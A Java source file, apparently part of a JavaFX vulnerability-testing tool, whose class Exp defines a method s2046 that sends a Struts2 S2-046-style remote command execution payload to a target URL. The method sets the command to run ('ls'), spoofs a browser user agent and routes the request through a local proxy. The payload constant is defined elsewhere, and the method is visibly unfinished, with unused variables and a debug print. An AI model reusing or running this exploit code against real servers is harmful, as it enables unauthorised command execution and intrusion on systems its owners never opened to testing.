package com.example.javafxdemo.Check;

import cn.hutool.http.HttpRequest;
import com.example.javafxdemo.Controller.ExecViewController;
import com.example.javafxdemo.Controller.SettingController;
import com.example.javafxdemo.Controller.VulTestViewController;
import com.example.javafxdemo.HelloController;

import java.util.HashMap;
import java.util.Map;

public class Exp {
    HashMap<String, String> heinfo = HelloController.helloinfo;
    public void s2046(String target){
        String payload_post = Payload.PAYLOADSTR.EXEC046;
        String ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36";
        String cookie = "1";
        String proxyhost = "127.0.0.1";
        String exec = "ls";
        String osType = "LIN";
        String check="s046";
        int port = 8080;
        Map<String, String> vulInfo = Payload.builder()
                .selectModelAndVul("exec", check)
                .selectExec(exec, osType)
                .VulInfo();
        String methodFields = heinfo.get("methodFields");
        System.out.println("11");
        byte[] xx = "".getBytes();
        HttpRequest req = HttpRequest.post(target).timeout(15000).form("x", xx, payload_post);
        String resp = req.header("User-Agent", ua)
                .header("Connection", "close")
                .cookie(cookie)
                .setHttpProxy(proxyhost, port)
                .execute()
                .httpVersion("HTTP/1.0")
                .toString();

    }

}


